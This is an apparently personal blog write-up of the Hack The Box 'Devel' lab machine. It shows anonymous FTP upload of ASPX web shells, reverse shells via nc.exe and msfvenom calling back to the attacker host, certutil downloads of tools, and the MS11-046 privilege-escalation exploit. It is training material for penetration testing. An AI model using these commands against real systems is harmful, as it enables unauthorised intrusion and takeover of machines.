---
layout: post
title:  "Devel Writeup - Hack The Box"
date:   2025-03-07
desc: ""
keywords: "HTB,OSCP,eJPT,Windows,FTP,MS11-046,afd.sys,Easy"
categories: [HTB]
tags: [HTB,OSCP,eJPT,Windows,FTP,MS11-046,afd.sys,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/devel_writeup/Devel.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I start a new post, this time the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** **Devel** box, cataloged as **Easy** but as I always say, the difficulty is **very subjective** because for one who does not have a great background any machine can be difficult if you have not yet practiced enough. I have also noticed that sometimes you find a possible attack vector and it doesn't work, but as the vulnerability is so well known you insist to make the exploit work and maybe you should look for another way to avoid the risk of getting frustrated and wasting a lot of unnecessary time, but all this makes professional growth. Now it remains to spawn the box and start the **Reconnaissance** phase.

<br /><br />
<img src="{{ site.img_path }}/devel_writeup/Devel_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Once the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform already informs me the **IP** of the box I can start the main phase of any black box Pentesting (**Reconnaissance**). I send a trace with `ping` to the target machine and observe that it has arrived, then with the **Hack4u** community tool (**[whichSystem.py](https://pastebin.com/MJKeviqb){:target="_blank"}**) I verify the **Operating System** of the machine and finally with `nmap` I leak the open ports, but only those using the **TCP** protocol, in case I do not find attack vectors I will extend the scan for those ports that may be using the **UDP** protocol. The most interesting thing at the moment, is that `nmap` informs me that port **21** is open and that the **FTP** service that is deployed allows authentication with the **anonymous** user. If I connect, I find some **Windows IIS Server** files but the most important thing is that <ins>I can upload files to it</ins>, I also have permissions to download files, but they do not have an important content at the moment.

```bash
ping -c 2 10.129.52.204
whichSystem.py 10.129.52.204
sudo nmap -sS --min-rate 5000-p- --open -vvv -n -Pn 10.129.52.204 -oG allPorts
nmap -sCV -p21,80 10.129.52.204 -oN targeted
cat targeted
#  --> Anonymous FTP login allowed
#  --> Microsoft IIS httpd 7.5

ftp 10.129.52.204
  anonymous
  dir

echo 'oldb0y was here' > test.txt

  put test.txt
  dir                         # :)
  prompt off
  mget iisstart.htm
```

<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I enumerate the other available service, which is a web page available on port **80** I can't find much interesting information neither with `whatweb` or **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}**, on the page you can only see the default image that **Windows IIS servers** have. In some **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** boxes they usually play a little with **Steganography**, but with `steghide` I can't leak information from the image. Finally I check that the file I just uploaded via **FTP** can be accessed from the browser, then I have an idea of the attack vector.

```bash
whatweb http://10.129.52.204

file welcome.png
exiftool welcome.png
steghide welcome.png

# http://10.129.52.204/test.txt       # :)
```

<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The first thing I try is to upload a **[SecLists](https://github.com/danielmiessler/SecLists){:target="_blank"}** Web Shell (`shell.aspx`) through the **FTP** protocol, but it does not work correctly when I access from the browser to its location and the server interprets it. There are other **Web Shells** so I look for a new option to upload, in this case `cmdasp.aspx`, and I can execute commands remotely. I perform some system enumeration commands and also verify that I am not in a container as the **IP** corresponds to the target machine.

```bash
locate shell.aspx
cp /usr/share/SecLists/Web-Shells/laudanum-1.0/aspx/shell.aspx reverse.aspx
ftp 10.129.52.204
  put reverse.aspx
  dir

locate *.aspx
cp /usr/share/webshells/aspx/cmdasp.aspx .
ftp 10.129.52.204
  put cmdasp.aspx

# http://10.129.52.204/cmdasp.aspx    # :)
  whoami          # iis apppool\web
  hostname        # devel
  ipconfig
```

<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have an **RCE**, I test the connectivity with the target machine and now if I think about the many different options to access the machine, I have many tools to practice and test which ones work (**this in a lab environment and not in a real one**). A first option is to open a local server with `impacket-smbserver` and share the `nc.exe` binary, then I can access from the **Browser** with the **Web Shell** to access the shared resource and run it to send me a **Reverse Shell** (**it works**). Another way is to create a malicious file (**aspx** format) with `msfvenom` that is responsible for sending a Shell to port **443** that I will open with `nc`, I just upload the binary via **FTP** and access it from the browser and **again access the box**. The third method, in which I did <ins>not succeed</ins>, was to upload `nc.exe` on the server but if I try to run it through the **Web Shell** it generated an error.

```bash
sudo tcpdump -i tun0 icmp -n
#  ping -n 2 10.10.14.84   # :)

locate nc.exe | grep usr
cp /usr/share/SecLists/Web-Shells/FuzzDB/nc.exe .
sudo impacket-smbserver smbFolder $(pwd) -smb2support
sudo rlwrap -cAr nc -nlvp 443
#  \\10.10.14.84\smbFolder\nc.exe -e cmd 10.10.14.84 443       # :)

# or:
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.84 LPORT=443 -f aspx -o malicious.aspx
ftp 10.129.52.204
  put malicious.aspx
sudo rlwrap -cAr nc -nlvp 443

# http://10.129.52.204/malicious.aspx                           # :)

# or:
ftp 10.129.52.204
  put nc.exe
sudo rlwrap -cAr nc -nlvp 443
#  C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.84 443            # :( This program cannot be run in DOS mode.
```

<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With the first system enumeration tasks, I check what privileges and permissions the compromised user has, he has the **SeImpersonatePrivilege** enabled so I think about the **ohpe** **[JuicyPotato](https://github.com/ohpe/juicy-potato){:target="_blank"}** exploit. Unfortunately I can't get the binary to work once I transfer it to the target machine. At the beginning of the post is that if it does not work and one is stubborn in trying to exploit a vulnerability (<ins>that's what happened to me</ins>), one can lose a lot of time and not understand that there may be other ways and you can continue to enumerate.

> **Victime Machine**:

```cmd
whoami
hostname
ipconfig
whoami /priv
whoami /all
# SeImpersonatePrivilege      JuicyPotato.exe
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/JuicyPotato.exe ./JP.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.84/JP.exe JP.exe
.\JP.exe
# This version of C:\Windows\Temp\privesc\JP.exe is not compatible with the version of Windows you're running. :(
```

<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I continue with the enumeration, I check with `systeminfo` that the **OS version** is very old and if I search in **ExploitDB** some exploit for this version I find one that **[exploits the MS11-046 vulnerability](https://www.exploit-db.com/exploits/40564){:target="_blank"}**, but the one in its database needs to be compiled and many times it is a **headache** to do this task. Good thing I found a **[ms11-046.exe](https://github.com/abatchy17/WindowsExploits){:target="_blank"}** exploit on **Github** that has the executable ready to download, I just need to download it, transfer it to the target machine and run it to **Escalate privileges**. Once I take full control of the box I can see the contents of the flags I need to enter on the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform.

> **[Microsoft Security Bulletin MS11-046](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046){:target="_blank"}** - Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2503665). The vulnerability could allow **elevation of privilege** if an attacker logs on to a user's system and runs a specially crafted application. An attacker must have valid logon credentials and be able to log on locally to exploit the vulnerability. 

> **Victime Machine**:

```cmd
systeminfo
# OS Version:                6.1.7600 N/A Build 7600
```

> **Attacker Machine**:

```bash
mv /home/al3j0/Downloads/MS11-046.exe .
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
certutil.exe -f -urlcache -split http://10.10.14.84/MS11-046.exe ms11-046.exe
.\ms11-046.exe
whoami
# :):):)
```

<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devel_writeup/Devel_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another great **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine that was nice to engage as I was able to practice some methods a bit forgotten in the exploitation phase. But what I also take away from this box as a great teaching, is that **I must not take anything for granted**, and avoid that when looking for attack vectors my mind does not just stick with what I already know, I must force it to **get out of the comfort zone** and think outside the box or tray harder the enumeration phase. I'm going to kill the box and move on to the next one, here I go.

<br /><br />
<img src="{{ site.img_path }}/devel_writeup/Devel_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
